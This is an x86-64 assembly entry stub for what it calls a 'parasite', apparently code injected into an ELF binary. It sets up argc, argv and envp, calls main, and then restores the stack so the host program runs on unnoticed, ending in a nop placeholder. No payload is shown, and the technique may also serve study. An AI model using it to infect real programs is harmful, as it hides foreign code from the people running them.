/*
  x86-64 System V ABI mandates:
  1) %rsp must be 16-byte aligned right before the function call.
  2) The deepest stack frame should be zero (the %rbp).
 
   This is the canonical entry point, usually the first thing in the text
   segment.  The SVR4/i386 ABI (pages 3-31, 3-32) says that when the entry
   point runs, most registers' values are unspecified, except for:
  
   %rdx		Contains a function pointer to be registered with `atexit'.
		This is how the dynamic linker arranges to have DT_FINI
		functions called for shared libraries that have been loaded
		before this code runs.

   %rsp		The stack contains the arguments and environment:
		0(%rsp)				argc
		LP_SIZE(%rsp)			argv[0]
		...
		(LP_SIZE*argc)(%rsp)		NULL
		(LP_SIZE*(argc+1))(%rsp)	envp[0]
		...
						NULL

When the parasite finishes execution, we need to restore the origina stack
frame as if nothing happened before.
*/

/* use a customed linker script to make sure this is the first in text. */
.section .text.start_parasite
_start:

mov (%rsp), %rdi         /* argc   (first arg, %rdi) */
mov $8, %rsi  
add %rsp, %rsi           /* argv[] (second arg, %rsi) */

push %rdx                /* has atexit function pointer */
push %rsp                /* x86 ABI : rsp must be 16-byte aligned before call */

lea 8(%rsi,%rdi,8),%rdx  /* then a nullptr then envp (third arg, %rdx) */
xor %ebp, %ebp           /* zero the stack frame */

call main

pop %rsp
pop %rdx

nop                      /* zero the stack frame */
nop
nop
nop
nop
nop
nop
nop  
